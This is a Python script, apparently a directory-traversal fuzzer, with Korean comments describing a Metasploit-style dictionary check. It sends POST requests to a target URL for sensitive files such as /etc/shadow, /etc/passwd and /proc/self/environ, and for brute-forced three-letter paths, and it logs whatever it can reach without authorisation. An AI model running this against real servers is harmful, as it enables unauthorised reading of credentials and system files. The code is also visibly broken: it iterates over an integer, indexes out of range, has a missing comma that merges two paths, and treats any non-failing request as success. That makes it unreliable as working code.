import sys
import requests as req
import urllib
import argparse
from requester import requester
from config import converter, headers  
from requests.exceptions import HTTPError
from itertools import permutations

#metasploit direactory traversal exploit dictionary check
#dictionary 값을 기반으로 random input host 주소 뒤에 날려서
#만약 권한 없이 들어가지는 값이 있으면 저장해서 마지막에 출력

def random_path(url):
    print(">>>>random_path fuzzing start")
    alphabets = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n',
            'o','p','q','r','s','t','u','v','w','x','y','z']
    random_success = []
    nn = 3 #length
    path_permutaion= list(permutations(alphabets,nn))
    paths = []
    for i in path_permutaion:
        new_path = ""
        for j in nn:
            new_path += i[nn]
        paths.append(new_path)
    for path in paths:
        try:
            res = req.post(url+path)  
            random_success.append(path)
        except:
            print(path,": fail")


def existed_path(url):
    print(">>>>existed_path fuzzing start")
    file_list = ["/etc/apache2/apache2.conf",
                "/etc/apt/sources.list",
                "/etc/centos-release"
                "/etc/debian_version",
                "/etc/fstab",
                "/etc/group",
                "/etc/hosts",
                "/etc/httpd/conf.d/ssl.conf",
                "/etc/httpd/conf.d/vhost.conf",
                "/etc/httpd/conf/httpd.conf",
                "/etc/inetd.conf",
                "/etc/init.d/rcS",
                "/etc/inittab",
                "/etc/issue",
                "/etc/motd",
                "/etc/mysql/my.cnf",
                "/etc/os-release",
                "/etc/passwd",
                "/etc/rc.d/rc.local",
                "/etc/redhat-release",
                "/etc/rsyslog.conf",
                "/etc/shadow",
                "/etc/system-release",
                "/etc/yum.conf",
                "/proc/cmdline",
                "/proc/mounts",
                "/proc/net/arp",
                "/proc/net/dev",
                "/proc/net/if_inet6",
                "/proc/net/route",
                "/proc/net/tcp",
                "/proc/net/udp",
                "/proc/sched_debug",
                "/proc/self/cmdline",
                "/proc/self/environ",
                "/proc/version",
                "/var/cache/locate/locatedb",
                "/var/lib/mlocate/mlocate.db",
                "/var/log/dmesg",
                "/var/log/messages",
                "/var/log/system.log",
                "/var/www/html/index.html"] #추가 필요
    existed_success = []
    for path in file_list:
        try:
            res = req.post(url+path)
            existed_success.append(path)
        except:
            print(path,": fail")
    return existed_success

if __name__ == "__main__":
    print("=============start============")
    url = input("target url: ")
    paramData, url = converter(url)
    if not url.startswith('http'):
        try:
            response = requester('https://' + url, headers, paramData)
            url = 'https://' + url
        except:
            url = 'http://' + url

    if requester(url, headers, paramData) == -1:
        sys.exit(-1)
    
    random_success = random_path(url)
    existed_success = existed_path(url)
